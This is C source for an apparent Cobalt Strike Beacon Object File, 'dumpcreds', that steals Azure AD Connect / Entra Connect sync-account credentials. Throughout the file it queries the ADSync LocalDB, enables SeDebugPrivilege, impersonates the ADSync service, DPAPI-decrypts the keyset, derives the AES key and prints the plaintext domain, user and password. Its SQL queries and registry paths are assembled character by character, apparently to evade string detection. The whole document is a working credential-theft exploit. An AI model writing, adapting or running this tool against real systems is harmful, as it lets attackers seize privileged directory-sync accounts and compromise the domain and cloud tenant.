#include "entrasyncdump_common.h"

// dumpcreds: extract MSOL_/Sync_ credentials from ADSync database.
//
// Prereqs: local administrator (NOT SYSTEM — LocalDB requires admin process identity).
//
// Flow:
//   1. Read version / resolve LocalDB instance
//   2. Connect to ADSync database (as local admin — before any impersonation)
//   3. Query instance_id, keyset_id, entropy from mms_server_configuration
//   4. Query private_configuration_xml + encrypted_configuration from mms_management_agent
//   5. Disconnect SQL
//   6. Enable SeDebugPrivilege, impersonate ADSync service
//   7. Retrieve DPAPI-protected keyset blob:
//      a. CredEnumerateW for Microsoft_AzureADConnect_KeySet_* (new format)
//      b. Fall back to registry HKLM\SOFTWARE\Microsoft\Ad Sync\Shared (legacy)
//   8. CryptUnprotectData the keyset blob (entropy = 16-byte GUID binary)
//   9. Extract AES-256 key from decrypted keyset: blob[-88:-44][12:] = 32 bytes
//  10. AES-CBC decrypt each encrypted_configuration
//  11. Parse decrypted UTF-16LE XML for password attribute
//  12. Output credentials

#define ENCRYPTED_CONFIG_SIZE (1024 * 64)
#define MAX_ENTROPY_STR 128
#define MAX_INSTANCE_STR 128
#define MAX_KEYSET_STR 32
#define KEYSET_BLOB_MAX (1024 * 16)

#ifndef CRYPTPROTECT_UI_FORBIDDEN
#define CRYPTPROTECT_UI_FORBIDDEN 0x1
#endif

typedef struct {
    CHAR* username;
    CHAR* domain;
    CHAR* encBlob;
} CRED_ROW;

#define MAX_CRED_ROWS 16

void cmd_dumpcreds(CONST WCHAR* overrideInstance) {

    ENTRACONNECT_VERSION ver = { 0 };
    BOOL sqlConnected      = FALSE;
    SQLHENV sqlEnvHandle   = NULL;
    SQLHDBC sqlConnHandle  = NULL;
    SQLHSTMT sqlStmtHandle = NULL;
    SQLRETURN sqlResult;
    WCHAR sqlDriverList[1024];
    WCHAR* sqlDriverName       = NULL;
    WCHAR* sqlConnectionString = NULL;
    SQLCHAR* privateConfig     = NULL;
    SQLCHAR* encryptedConfig   = NULL;
    HANDLE hImpToken           = NULL;
    CRED_ROW rows[MAX_CRED_ROWS];
    INT rowCount = 0;
    INT i;

    CHAR entropyStr[MAX_ENTROPY_STR];
    CHAR instanceIdStr[MAX_INSTANCE_STR];
    CHAR keysetIdStr[MAX_KEYSET_STR];
    INT entropyStrLen = 0;

    BYTE entropyBytes[16];
    BYTE* keysetBlob = NULL;
    DWORD keysetBlobLen = 0;
    BYTE* decryptedKey = NULL;
    DWORD decryptedKeyLen = 0;

    for (i = 0; i < MAX_CRED_ROWS; i++) {
        rows[i].username = NULL;
        rows[i].domain = NULL;
        rows[i].encBlob = NULL;
    }
    entropyStr[0] = '\0';
    instanceIdStr[0] = '\0';
    keysetIdStr[0] = '\0';

    // Step 1: Read version
    if (!read_entra_version(&ver)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not find or read target installation.\n");
        return;
    }

    CHAR verStr[32];
    API(MSVCRT, sprintf)(verStr, "%d.%d.%d.%d", ver.major, ver.minor, ver.build, ver.revision);
    VerbosePrintf(CALLBACK_OUTPUT, "[*] Version %s detected.\n", verStr);

    // Step 2: SQL as local admin (BEFORE any impersonation)
    CONST WCHAR* sqlInstanceName = resolve_localdb_instance(overrideInstance);
    if (!sqlInstanceName) {
        BeaconPrintf(CALLBACK_ERROR, "Could not determine LocalDB instance name.\n");
        return;
    }

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &sqlEnvHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL env handle.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLSetEnvAttr)(sqlEnvHandle, SQL_ATTR_ODBC_VERSION, (SQLPOINTER*)SQL_OV_ODBC3, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to set ODBC version.\n"); goto sql_cleanup; }

    if (!API(ODBCCP32, SQLGetInstalledDriversW)(sqlDriverList, sizeof(sqlDriverList) / sizeof(WCHAR), NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SQL driver list.\n");
        goto sql_cleanup;
    }

    for (CONST WCHAR* driver = sqlDriverList; *driver; driver += API(MSVCRT, wcslen)(driver) + 1) {
        if (API(MSVCRT, wcsstr)(driver, L"ODBC Driver ") && API(MSVCRT, wcsstr)(driver, L"for SQL Server")) {
            sqlDriverName = driver;
            break;
        }
    }

    if (!sqlDriverName) { BeaconPrintf(CALLBACK_ERROR, "No suitable ODBC SQL Server driver found.\n"); goto sql_cleanup; }

    WCHAR wConnFmt[] = { 'D','r','i','v','e','r','=','{','%','l','s','}'
        ,';','S','e','r','v','e','r','=','(','L','o','c','a','l','D','B',')'
        ,'\\','.','\\','%','l','s'
        ,';','D','a','t','a','b','a','s','e','=','A','D','S','y','n','c'
        ,';','T','r','u','s','t','e','d','_','C','o','n','n','e','c','t','i','o','n','=','y','e','s',0 };
    SIZE_T connFmtLen = API(MSVCRT, wcslen)(wConnFmt);
    SIZE_T connStrMaxChars = API(MSVCRT, wcslen)(sqlDriverName) + API(MSVCRT, wcslen)(sqlInstanceName) + connFmtLen + 1;
    sqlConnectionString = BofHeapAlloc(connStrMaxChars * sizeof(WCHAR));
    if (!sqlConnectionString) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate connection string.\n"); goto sql_cleanup; }
    API(MSVCRT, _snwprintf)(sqlConnectionString, connStrMaxChars, wConnFmt, sqlDriverName, sqlInstanceName);

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_DBC, sqlEnvHandle, &sqlConnHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection handle.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLSetConnectAttrW)(sqlConnHandle, SQL_LOGIN_TIMEOUT, (SQLPOINTER)CONNECT_TIMEOUT, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to set SQL timeout.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLDriverConnectW)(sqlConnHandle, NULL, sqlConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to connect to database. %ls\n", get_last_sql_error(sqlConnHandle, sqlResult));
        goto sql_cleanup;
    }
    sqlConnected = TRUE;
    VerbosePrintf(CALLBACK_OUTPUT, "[+] Connected to database\n");

    // Step 3: Query instance_id, keyset_id, entropy from mms_server_configuration
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.\n"); goto sql_cleanup; }

    WCHAR wConfigQuery[] = { 'S','E','L','E','C','T',' ',
        'C','A','S','T','(','i','n','s','t','a','n','c','e','_','i','d',' ','A','S',' ',
        'N','V','A','R','C','H','A','R','(','1','2','8',')',')',',',' ',
        'k','e','y','s','e','t','_','i','d',',',' ',
        'C','A','S','T','(','e','n','t','r','o','p','y',' ','A','S',' ',
        'N','V','A','R','C','H','A','R','(','1','2','8',')',')',' ',
        'F','R','O','M',' ',
        'm','m','s','_','s','e','r','v','e','r','_','c','o','n','f','i','g','u','r','a','t','i','o','n',';',0 };

    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, wConfigQuery, SQL_NTS);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to query server configuration.\n");
        goto sql_cleanup;
    }

    SQLLEN instanceIdLen = 0, keysetIdColLen = 0, entropyColLen = 0;
    SQLINTEGER keysetIdInt = 0;

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 1, SQL_C_CHAR, instanceIdStr, MAX_INSTANCE_STR, &instanceIdLen);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind instance_id column.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 2, SQL_C_LONG, &keysetIdInt, sizeof(keysetIdInt), &keysetIdColLen);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind keyset_id column.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 3, SQL_C_CHAR, entropyStr, MAX_ENTROPY_STR, &entropyColLen);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind entropy column.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLFetch)(sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult) || entropyColLen <= 0 || instanceIdLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to fetch server configuration row.\n");
        goto sql_cleanup;
    }
    entropyStrLen = API(MSVCRT, strlen)(entropyStr);
    API(MSVCRT, _snprintf)(keysetIdStr, MAX_KEYSET_STR, "%d", keysetIdInt);

    VerbosePrintf(CALLBACK_OUTPUT, "[+] instance_id: %s\n", instanceIdStr);
    VerbosePrintf(CALLBACK_OUTPUT, "[+] keyset_id:   %d\n", keysetIdInt);
    VerbosePrintf(CALLBACK_OUTPUT, "[+] entropy:     %s\n", entropyStr);

    // Convert entropy GUID string to 16-byte binary (mixed-endian Windows GUID format)
    if (guid_string_to_bytes(entropyStr, entropyBytes) != 16) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse entropy GUID: %s\n", entropyStr);
        goto sql_cleanup;
    }

    {
        CHAR hexBuf[64];
        INT hexOff = 0;
        for (INT h = 0; h < 16; h++) {
            hexOff += API(MSVCRT, _snprintf)(hexBuf + hexOff, 64 - hexOff, "%02X", entropyBytes[h]);
        }
        VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Entropy GUID binary (16 bytes): %s\n", hexBuf);
    }

    API(ODBC32, SQLFreeHandle)(SQL_HANDLE_STMT, sqlStmtHandle);
    sqlStmtHandle = NULL;

    // Step 4: Query credential data from mms_management_agent
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.\n"); goto sql_cleanup; }

    WCHAR wQuery[] = { 'S','E','L','E','C','T',' ',
        'p','r','i','v','a','t','e','_','c','o','n','f','i','g','u','r','a','t','i','o','n','_','x','m','l',',',' ',
        'e','n','c','r','y','p','t','e','d','_','c','o','n','f','i','g','u','r','a','t','i','o','n',' ',
        'F','R','O','M',' ','m','m','s','_','m','a','n','a','g','e','m','e','n','t','_','a','g','e','n','t',';',0 };

    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, wQuery, SQL_NTS);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to execute credential query.\n"); goto sql_cleanup; }

    privateConfig = BofHeapAlloc(CONFIG_SIZE * sizeof(SQLCHAR));
    encryptedConfig = BofHeapAlloc(ENCRYPTED_CONFIG_SIZE * sizeof(SQLCHAR));
    if (!privateConfig || !encryptedConfig) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate config buffers.\n"); goto sql_cleanup; }

    SQLLEN privateConfigLen = 0;
    SQLLEN encryptedConfigLen = 0;

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 1, SQL_C_CHAR, privateConfig, CONFIG_SIZE * sizeof(SQLCHAR), &privateConfigLen);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind column 1.\n"); goto sql_cleanup; }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 2, SQL_C_CHAR, encryptedConfig, ENCRYPTED_CONFIG_SIZE * sizeof(SQLCHAR), &encryptedConfigLen);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind column 2.\n"); goto sql_cleanup; }

    INT totalRows = 0;
    while (IS_SQL_SUCCESS(API(ODBC32, SQLFetch)(sqlStmtHandle)) && rowCount < MAX_CRED_ROWS) {
        totalRows++;

        if (privateConfigLen <= 0 || encryptedConfigLen <= 0) {
            VerbosePrintf(CALLBACK_OUTPUT, "[*] Row %d: empty config, skipping.\n", totalRows);
            continue;
        }

        CONST CHAR* u = find_xml_element((CONST CHAR*)privateConfig,
            "<forest-login-user>", "</forest-login-user>");
        if (!u) {
            VerbosePrintf(CALLBACK_OUTPUT, "[*] Row %d: no forest-login-user, skipping (not an AD connector).\n", totalRows);
            continue;
        }

        CONST CHAR* d = find_xml_element((CONST CHAR*)privateConfig,
            "<forest-login-domain>", "</forest-login-domain>");
        if (!d) {
            d = find_xml_element((CONST CHAR*)privateConfig,
                "<forest-name>", "</forest-name>");
        }

        INT ecLen = API(MSVCRT, strlen)((CONST CHAR*)encryptedConfig);
        CHAR* blob = BofHeapAlloc(ecLen + 1);
        if (!blob) {
            if (u) BofHeapFree(u);
            if (d) BofHeapFree(d);
            continue;
        }
        API(MSVCRT, memcpy)(blob, encryptedConfig, ecLen);
        blob[ecLen] = '\0';

        rows[rowCount].username = u;
        rows[rowCount].domain = d;
        rows[rowCount].encBlob = blob;
        rowCount++;

        VerbosePrintf(CALLBACK_OUTPUT, "[+] Row %d: found user %s (blob %d bytes b64)\n", totalRows, u, ecLen);
    }

    // Step 5: Close SQL
sql_cleanup:
    if (privateConfig) BofHeapFree(privateConfig);
    if (encryptedConfig) BofHeapFree(encryptedConfig);
    if (sqlStmtHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_STMT, sqlStmtHandle);
    if (sqlConnected) API(ODBC32, SQLDisconnect)(sqlConnHandle);
    if (sqlConnHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_DBC, sqlConnHandle);
    if (sqlEnvHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_ENV, sqlEnvHandle);
    if (sqlConnectionString) BofHeapFree(sqlConnectionString);

    if (rowCount == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No AD connector credential rows found in database.\n");
        goto final_cleanup;
    }

    if (entropyStrLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No entropy retrieved — cannot decrypt.\n");
        goto final_cleanup;
    }

    VerbosePrintf(CALLBACK_OUTPUT, "[*] Found %d AD connector row(s). Retrieving keyset...\n", rowCount);

    // Step 6: Impersonate ADSync for DPAPI decryption
    if (!enable_debug_privilege()) {
        goto final_cleanup;
    }
    VerbosePrintf(CALLBACK_OUTPUT, "[+] Privilege enabled\n");

    hImpToken = impersonate_adsync();
    if (!hImpToken) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not impersonate service. DPAPI decryption requires service context.\n");
        goto final_cleanup;
    }

    // Step 7: Retrieve DPAPI-protected keyset blob
    // 7a: Try credential store (new format)
    {
        WCHAR wCredFilter[] = {'M','i','c','r','o','s','o','f','t','_',
            'A','z','u','r','e','A','D','C','o','n','n','e','c','t','_',
            'K','e','y','S','e','t','_','*',0};
        DWORD credCount = 0;
        PVOID pCredentials = NULL;

        VerbosePrintf(CALLBACK_OUTPUT, "[*] Trying credential store (CredEnumerateW)...\n");

        if (API(ADVAPI32, CredEnumerateW)(wCredFilter, 0, &credCount, &pCredentials)) {
            VerbosePrintf(CALLBACK_OUTPUT, "[+] Found %d credential(s) matching KeySet filter\n", credCount);
            PBOF_CREDENTIALW* credArray = (PBOF_CREDENTIALW*)pCredentials;

            for (DWORD ci = 0; ci < credCount; ci++) {
                PBOF_CREDENTIALW cred = credArray[ci];
                VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Credential %d: target=%ls, blobSize=%d\n",
                    ci, cred->TargetName, cred->CredentialBlobSize);

                if (cred->CredentialBlobSize > 0 && cred->CredentialBlob) {
                    keysetBlobLen = cred->CredentialBlobSize;
                    keysetBlob = BofHeapAlloc(keysetBlobLen);
                    if (keysetBlob) {
                        API(MSVCRT, memcpy)(keysetBlob, cred->CredentialBlob, keysetBlobLen);
                        VerbosePrintf(CALLBACK_OUTPUT, "[+] Extracted keyset blob from credential store (%d bytes)\n", keysetBlobLen);
                    }
                    break;
                }
            }
            API(ADVAPI32, CredFree)(pCredentials);
        } else {
            VerbosePrintf(CALLBACK_OUTPUT, "[*] CredEnumerateW failed (error %d), trying registry...\n",
                API(KERNEL32, GetLastError)());
        }
    }

    // 7b: Fall back to registry (legacy format)
    if (!keysetBlob) {
        HKEY hSharedKey = NULL;
        WCHAR wRegPath[] = {'S','O','F','T','W','A','R','E','\\',
            'M','i','c','r','o','s','o','f','t','\\',
            'A','d',' ','S','y','n','c','\\',
            'S','h','a','r','e','d',0};

        VerbosePrintf(CALLBACK_OUTPUT, "[*] Trying registry (legacy format)...\n");

        LONG regResult = API(ADVAPI32, RegOpenKeyExW)(
            HKEY_LOCAL_MACHINE, wRegPath, 0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hSharedKey);

        if (regResult == 0) {
            WCHAR subKeyName[256];
            DWORD subKeyNameLen;
            DWORD subKeyIdx = 0;

            while (1) {
                subKeyNameLen = 256;
                regResult = API(ADVAPI32, RegEnumKeyExW)(
                    hSharedKey, subKeyIdx++, subKeyName, &subKeyNameLen, NULL, NULL, NULL, NULL);
                if (regResult != 0) break;

                VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Registry subkey: %ls\n", subKeyName);

                HKEY hSubKey = NULL;
                regResult = API(ADVAPI32, RegOpenKeyExW)(hSharedKey, subKeyName, 0, KEY_READ, &hSubKey);
                if (regResult != 0) continue;

                DWORD dataSize = 0;
                DWORD dataType = 0;
                regResult = API(ADVAPI32, RegQueryValueExW)(hSubKey, NULL, NULL, &dataType, NULL, &dataSize);
                if (regResult == 0 && dataSize > 0 && dataSize < KEYSET_BLOB_MAX) {
                    keysetBlob = BofHeapAlloc(dataSize);
                    if (keysetBlob) {
                        keysetBlobLen = dataSize;
                        regResult = API(ADVAPI32, RegQueryValueExW)(
                            hSubKey, NULL, NULL, NULL, keysetBlob, &keysetBlobLen);
                        if (regResult == 0) {
                            VerbosePrintf(CALLBACK_OUTPUT, "[+] Extracted keyset blob from registry (%d bytes)\n", keysetBlobLen);
                            API(ADVAPI32, RegCloseKey)(hSubKey);
                            break;
                        }
                        BofHeapFree(keysetBlob);
                        keysetBlob = NULL;
                        keysetBlobLen = 0;
                    }
                }
                API(ADVAPI32, RegCloseKey)(hSubKey);
            }
            API(ADVAPI32, RegCloseKey)(hSharedKey);
        } else {
            VerbosePrintf(CALLBACK_OUTPUT, "[*] Registry key not found (error %d)\n", regResult);
        }
    }

    if (!keysetBlob || keysetBlobLen == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Could not retrieve keyset blob from credential store or registry.\n"
            "    Ensure miiserver.exe is running and you have admin access.\n");
        goto final_cleanup;
    }

    {
        CHAR hexBuf[96];
        INT hexOff = 0;
        INT showLen = (keysetBlobLen > 32) ? 32 : keysetBlobLen;
        for (INT h = 0; h < showLen; h++) {
            hexOff += API(MSVCRT, _snprintf)(hexBuf + hexOff, 96 - hexOff, "%02X", keysetBlob[h]);
        }
        if (keysetBlobLen > 32) API(MSVCRT, _snprintf)(hexBuf + hexOff, 96 - hexOff, "...");
        VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Keyset blob (%d bytes): %s\n", keysetBlobLen, hexBuf);
    }

    // Step 8: DPAPI decrypt the keyset blob
    VerbosePrintf(CALLBACK_OUTPUT, "[*] DPAPI decrypting keyset blob...\n");
    {
        DATA_BLOB dataIn, dataOut, entropyBlob;
        dataIn.pbData = keysetBlob;
        dataIn.cbData = keysetBlobLen;
        dataOut.pbData = NULL;
        dataOut.cbData = 0;
        entropyBlob.pbData = entropyBytes;
        entropyBlob.cbData = 16;

        BOOL dpResult = API(CRYPT32, CryptUnprotectData)(
            &dataIn, NULL, &entropyBlob, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &dataOut);

        if (!dpResult || !dataOut.pbData || dataOut.cbData == 0) {
            DWORD dpErr = API(KERNEL32, GetLastError)();
            BeaconPrintf(CALLBACK_ERROR,
                "[-] DPAPI decryption of keyset failed: error %d\n"
                "    Blob size: %d, entropy: 16 bytes (GUID binary)\n",
                dpErr, keysetBlobLen);
            if (dataOut.pbData) API(KERNEL32, LocalFree)(dataOut.pbData);
            goto final_cleanup;
        }

        decryptedKeyLen = dataOut.cbData;
        decryptedKey = BofHeapAlloc(decryptedKeyLen);
        if (!decryptedKey) {
            API(KERNEL32, LocalFree)(dataOut.pbData);
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate key buffer.\n");
            goto final_cleanup;
        }
        API(MSVCRT, memcpy)(decryptedKey, dataOut.pbData, decryptedKeyLen);
        API(KERNEL32, LocalFree)(dataOut.pbData);

        VerbosePrintf(CALLBACK_OUTPUT, "[+] DPAPI decrypted keyset: %d bytes\n", decryptedKeyLen);
    }

    // Step 9: Extract AES-256 key from decrypted keyset
    if (decryptedKeyLen < 88) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Decrypted keyset too small (%d bytes, need >= 88). Wrong keyset or entropy?\n",
            decryptedKeyLen);
        goto final_cleanup;
    }

    BYTE* key2 = decryptedKey + decryptedKeyLen - 88;
    BYTE* aesKey = key2 + 12;

    {
        CHAR hexBuf[96];
        INT hexOff = 0;
        for (INT h = 0; h < 32; h++) {
            hexOff += API(MSVCRT, _snprintf)(hexBuf + hexOff, 96 - hexOff, "%02X", aesKey[h]);
        }
        VerbosePrintf(CALLBACK_OUTPUT, "[DBG] AES-256 key: %s\n", hexBuf);
    }

    // Step 10: AES-CBC decrypt each encrypted_configuration
    VerbosePrintf(CALLBACK_OUTPUT, "[*] Decrypting %d credential row(s)...\n", rowCount);

    for (i = 0; i < rowCount; i++) {
        INT b64Len = API(MSVCRT, strlen)(rows[i].encBlob);
        INT maxDecoded = (b64Len / 4) * 3 + 4;
        BYTE* decoded = BofHeapAlloc(maxDecoded);
        if (!decoded) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate decode buffer for row %d.\n", i + 1);
            continue;
        }

        INT decodedLen = base64_decode(rows[i].encBlob, decoded, maxDecoded);
        if (decodedLen <= 24) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Base64 decode failed or too short for row %d (got %d bytes, need >24).\n", i + 1, decodedLen);
            BofHeapFree(decoded);
            continue;
        }

        VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Row %d: b64=%d chars, decoded=%d bytes\n", i + 1, b64Len, decodedLen);

        BYTE* iv = decoded + 8;
        BYTE* ciphertext = decoded + 24;
        INT ciphertextLen = decodedLen - 24;

        {
            CHAR hexBuf[64];
            INT hexOff = 0;
            for (INT h = 0; h < 16; h++) {
                hexOff += API(MSVCRT, _snprintf)(hexBuf + hexOff, 64 - hexOff, "%02X", iv[h]);
            }
            VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Row %d: IV=%s, ciphertext=%d bytes\n", i + 1, hexBuf, ciphertextLen);
        }

        // AES-256-CBC decrypt
        BCRYPT_ALG_HANDLE hAesAlg = NULL;
        BCRYPT_KEY_HANDLE hAesKey = NULL;
        NTSTATUS status;

        status = API(BCRYPT, BCryptOpenAlgorithmProvider)(&hAesAlg, L"AES", NULL, 0);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] BCryptOpenAlgorithmProvider(AES) failed: 0x%08x\n", status);
            BofHeapFree(decoded);
            continue;
        }

        WCHAR wChainProp[] = {'C','h','a','i','n','i','n','g','M','o','d','e',0};
        WCHAR wCBCMode[] = {'C','h','a','i','n','i','n','g','M','o','d','e','C','B','C',0};
        status = API(BCRYPT, BCryptSetProperty)(hAesAlg, wChainProp, (PUCHAR)wCBCMode, sizeof(wCBCMode), 0);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] BCryptSetProperty(ChainingModeCBC) failed: 0x%08x\n", status);
            API(BCRYPT, BCryptCloseAlgorithmProvider)(hAesAlg, 0);
            BofHeapFree(decoded);
            continue;
        }

        status = API(BCRYPT, BCryptGenerateSymmetricKey)(hAesAlg, &hAesKey, NULL, 0, aesKey, 32, 0);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] BCryptGenerateSymmetricKey failed: 0x%08x\n", status);
            API(BCRYPT, BCryptCloseAlgorithmProvider)(hAesAlg, 0);
            BofHeapFree(decoded);
            continue;
        }

        BYTE* plaintext = BofHeapAlloc(ciphertextLen + 16);
        if (!plaintext) {
            API(BCRYPT, BCryptDestroyKey)(hAesKey);
            API(BCRYPT, BCryptCloseAlgorithmProvider)(hAesAlg, 0);
            BofHeapFree(decoded);
            continue;
        }

        BYTE ivCopy[16];
        API(MSVCRT, memcpy)(ivCopy, iv, 16);

        ULONG cbResult = 0;
        status = API(BCRYPT, BCryptDecrypt)(hAesKey, ciphertext, ciphertextLen, NULL,
            ivCopy, 16, plaintext, ciphertextLen + 16, &cbResult, 0);

        API(BCRYPT, BCryptDestroyKey)(hAesKey);
        API(BCRYPT, BCryptCloseAlgorithmProvider)(hAesAlg, 0);
        BofHeapFree(decoded);

        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] AES-CBC decryption failed for row %d: 0x%08x\n", i + 1, status);
            BofHeapFree(plaintext);
            continue;
        }

        VerbosePrintf(CALLBACK_OUTPUT, "[+] Row %d: AES decrypted %d bytes\n", i + 1, cbResult);

        // PKCS7 unpad
        if (cbResult > 0) {
            BYTE padByte = plaintext[cbResult - 1];
            if (padByte > 0 && padByte <= 16) {
                cbResult -= padByte;
            }
        }

        // Step 11: Parse decrypted XML (UTF-16LE) for password
        INT wcharCount = cbResult / 2;
        CHAR* narrowXml = BofHeapAlloc(wcharCount + 1);
        if (!narrowXml) {
            for (DWORD z = 0; z < cbResult; z++) plaintext[z] = 0;
            BofHeapFree(plaintext);
            continue;
        }

        for (INT j = 0; j < wcharCount; j++) {
            WCHAR wc = *((WCHAR*)(plaintext + j * 2));
            narrowXml[j] = (wc <= 0xFF) ? (CHAR)wc : '?';
        }
        narrowXml[wcharCount] = '\0';

        VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Row %d decrypted XML (%d chars): %.200s...\n",
            i + 1, wcharCount, narrowXml);

        // Find password — find_xml_element also html-unescapes the value
        CONST CHAR* password = find_xml_element(narrowXml,
            "<attribute name=\"password\">", "</attribute>");
        if (!password) password = find_xml_element(narrowXml,
            "<attribute name=\"Password\">", "</attribute>");

        if (password) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "%s\\%s %s\n",
                rows[i].domain ? rows[i].domain : ".",
                rows[i].username,
                password);

            INT pwLen2 = API(MSVCRT, strlen)(password);
            for (INT z = 0; z < pwLen2; z++) ((CHAR*)password)[z] = 0;
            BofHeapFree(password);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Row %d: decrypted OK but password attribute not found in XML.\n", i + 1);
            VerbosePrintf(CALLBACK_OUTPUT, "[DBG] Full decrypted XML:\n%s\n", narrowXml);
        }

        for (INT z = 0; z < wcharCount; z++) narrowXml[z] = 0;
        BofHeapFree(narrowXml);
        for (DWORD z = 0; z < cbResult; z++) plaintext[z] = 0;
        BofHeapFree(plaintext);
    }

    API(ADVAPI32, RevertToSelf)();
    API(KERNEL32, CloseHandle)(hImpToken);
    hImpToken = NULL;

final_cleanup:
    for (i = 0; i < rowCount; i++) {
        if (rows[i].username) BofHeapFree(rows[i].username);
        if (rows[i].domain) BofHeapFree(rows[i].domain);
        if (rows[i].encBlob) BofHeapFree(rows[i].encBlob);
    }
    if (decryptedKey) {
        for (DWORD z = 0; z < decryptedKeyLen; z++) decryptedKey[z] = 0;
        BofHeapFree(decryptedKey);
    }
    if (keysetBlob) BofHeapFree(keysetBlob);
    if (hImpToken) {
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hImpToken);
    }
}


#ifdef _DEBUG
void main(int argc, char* argv[]) {
    wchar_t wInstance[64] = { 0 };
    CONST wchar_t* instanceArg = NULL;
    if (argc >= 2 && argv[1][0]) {
        for (int i = 0; argv[1][i] && i < 63; i++) wInstance[i] = (wchar_t)argv[1][i];
        instanceArg = wInstance;
    }
    cmd_dumpcreds(instanceArg);
}
#else
void go(PCHAR args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    CHAR* instanceArgA = BeaconDataExtract(&parser, NULL);
    WCHAR instanceArgW[64] = { 0 };
    CONST WCHAR* instanceOverride = NULL;
    if (instanceArgA && API(MSVCRT, strlen)(instanceArgA) > 0) {
        toWideChar(instanceArgA, instanceArgW, 64);
        instanceOverride = instanceArgW;
    }
    cmd_dumpcreds(instanceOverride);
}
#endif
